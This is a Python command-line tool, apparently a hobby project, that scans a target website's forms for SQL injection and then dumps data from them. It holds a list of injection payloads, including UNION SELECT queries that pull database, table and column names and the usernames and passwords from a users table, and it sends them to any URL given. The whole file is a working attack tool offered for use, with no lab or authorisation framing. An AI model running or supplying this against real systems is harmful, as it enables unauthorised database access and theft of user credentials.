import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import argparse
import datetime
from colorama import Fore, Style, init
import re

# Initialize colorama
init(autoreset=True)

# SQL Injection payloads
payloads = [
    "' OR 1=1 --",  # Basic SQLi payload
    "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
    "' WAITFOR DELAY '0:0:5' --",  # Time-based Blind SQLi
    "' AND 1=1 --",  # Another basic payload
]

# Data dump payloads
data_dump_payloads = [
    "' UNION SELECT NULL, NULL, database() --",  # Get database name
    "' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'your_db_name' --",  # Get table names
    "' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Get columns of users table
    "' UNION SELECT username, password FROM users --",  # Dump usernames and passwords
]

# Function to print time-stamped logs in color
def print_log(message, color=Fore.YELLOW):
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.BLUE}[{current_time}] {color}[INFO] {message}{Style.RESET_ALL}")

# Function to detect SQLi vulnerabilities
def detect_sqli(url, payload, headers):
    try:
        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"}, timeout=10)
        
        if response.status_code == 200:
            # Check for common SQL error keywords in response
            sql_error_keywords = ["error", "sql", "mysql", "syntax", "database", "unclosed", "unexpected"]
            if any(keyword in response.text.lower() for keyword in sql_error_keywords):
                print_log(f"SQLi vulnerability detected with payload: {payload}")
                return True
            # Look for unexpected output or change in behavior (e.g., unexpected number of characters or content in the response)
            if len(response.text) > 1000:  # You can adjust this threshold based on your app's normal size
                print_log(f"Potential SQLi found: Large response size change with payload: {payload}")
                return True
        return False
    except requests.RequestException as e:
        print_log(f"Error sending request: {e}", Fore.RED)
        return False

# Function to dump data from a vulnerable page
def dump_data(url, payloads, headers):
    for payload in payloads:
        print_log(f"Trying payload for data dump: {payload}", Fore.YELLOW)
        response = requests.get(url, headers=headers, params={"username": payload, "password": "anything"})
        
        if "username" in response.text.lower() or "password" in response.text.lower():
            print_log("Data dump result:")
            print(response.text[:500])  # Print first 500 characters of the response for review

# Function to scan forms and detect SQLi vulnerabilities
def scan_forms_and_dump(url, headers, payloads, data_dump_payloads):
    response = requests.get(url, headers=headers)
    
    if response.status_code != 200:
        print_log(f"Failed to retrieve the page. Status code: {response.status_code}", Fore.RED)
        return

    soup = BeautifulSoup(response.text, "html.parser")
    
    forms = soup.find_all("form")
    
    forms_detected = 0
    successful_payloads = []
    
    for form in forms:
        action_url = form.get("action")
        if not action_url:
            continue
        
        action_url = urljoin(url, action_url)

        print_log(f"Testing form at {action_url}", Fore.YELLOW)

        for payload in payloads:
            if detect_sqli(action_url, payload, headers):
                forms_detected += 1
                successful_payloads.append(payload)
    
    print_log(f"\nDetected {forms_detected} vulnerable form(s) with SQLi.", Fore.YELLOW)
    
    if forms_detected > 0:
        print_log("\nDumping data...", Fore.YELLOW)
        dump_data(url, data_dump_payloads, headers)
    else:
        print_log("No SQLi vulnerabilities detected. No data dump performed.", Fore.RED)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Scanner and Data Dumper")
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan (e.g., http://example.com/login.php)")
    parser.add_argument("-dbs-get", action="store_true", help="Flag to dump database information if SQLi is found")
    args = parser.parse_args()

    # Define headers for the requests
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    if args.dbs_get:
        print_log(f"Starting scan on {args.url}...\n", Fore.GREEN)
        scan_forms_and_dump(args.url, headers, payloads, data_dump_payloads)

if __name__ == "__main__":
    main()
